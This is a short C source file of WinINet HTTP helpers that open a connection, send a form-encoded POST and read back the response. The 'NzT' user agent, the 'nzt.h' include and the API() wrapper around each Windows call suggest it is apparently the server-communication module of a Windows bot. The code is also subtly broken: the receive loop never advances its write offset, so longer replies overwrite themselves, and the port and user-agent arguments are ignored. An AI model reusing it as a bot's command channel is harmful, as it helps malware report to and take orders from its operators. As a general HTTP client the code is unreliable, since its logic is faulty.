#include <Windows.h>
#include <Wininet.h>

#include "nzt.h"
#include "http.h"
#include "utils.h"

HINTERNET HttpConnect(
	LPSTR UserAgent, 
	LPSTR Host, 
	WORD Port, 
	DWORD Flags
)
{
	HINTERNET Internet	= 0;
	HINTERNET Connect	= 0;
	
	do
	{
		Internet = API(InternetOpenW(L"NzT", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0));
		if (Internet == NULL)
			break;

		Connect = API(InternetConnectA(Internet, Host, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1));
		if (Connect == NULL)
			break;
	} while (FALSE);

	return Connect;
}

HINTERNET HttpRequest(
	HINTERNET   Connect,
	BOOL	    bPost,
	LPSTR	    URI,
	LPSTR       Referrer,
	PCHAR		Data,
	DWORD       Flags
)
{
	HINTERNET Request  = 0;
	DWORD	  Size     = sizeof(DWORD);
	DWORD	  Status   = 0;
	BOOL	  Send	   = FALSE;

	static LPSTR AcceptTypes[2] = { "*/*", NULL };
	static TCHAR Header[]		= ("Content-Type: application/x-www-form-urlencoded");

	do
	{
		Request = API(HttpOpenRequestA(Connect, "POST", URI, NULL, NULL, AcceptTypes, 0, 1));
		if (Request == NULL)
			break;

		Send = API(HttpSendRequestA(Request, Header, StringLengthA(Header), Data, StringLengthA(Data)));
		if (Send == FALSE)
			break;
		
		return Request;

	} while (FALSE);

	return NULL;
}

BOOL HttpReceiveData(HINTERNET Request, PCHAR* Buffer)
{
	CHAR	Data[256]   = { 0 };
	DWORD	Received	= 0;
	DWORD	Read		= 0;

	ZeroMemory(&Data, sizeof(Data));

	while (API(InternetReadFile(Request, Data, 256 - 1, &Received)) && Received != 0)
	{
		if (!ReallocEx(&(*Buffer), Read + Received + 1))
			return FALSE;

		MemoryCopy((*Buffer) + Read, &Data, Received);
		ZeroMemory(&Data, sizeof(Data));
	}

	return TRUE;
}

BOOL HttpPostRequest(
	PCHAR  Host,
	PCHAR  URI,
	PCHAR  Data,
	PCHAR* Response
)
{
	HINTERNET Connect = 0;
	HINTERNET Request = 0;
	BOOL	  Status  = FALSE;

	do
	{
		Connect = HttpConnect(HTTP_USER_AGENT, Host, INTERNET_DEFAULT_HTTP_PORT, 0);
		if (Connect == NULL)
			break;

		Request = HttpRequest(Connect, TRUE, URI, NULL, Data, 0);
		if (Request == NULL)
			break;

		Status = HttpReceiveData(Request, Response);
	} while (FALSE);

	if (!Status)
		DebugPrint("NzT: HttpPostRequest() failed!");

	if (Connect != NULL)
		API(InternetCloseHandle(Connect));

	if (Request != NULL)
		API(InternetCloseHandle(Request));

	return Status;
}
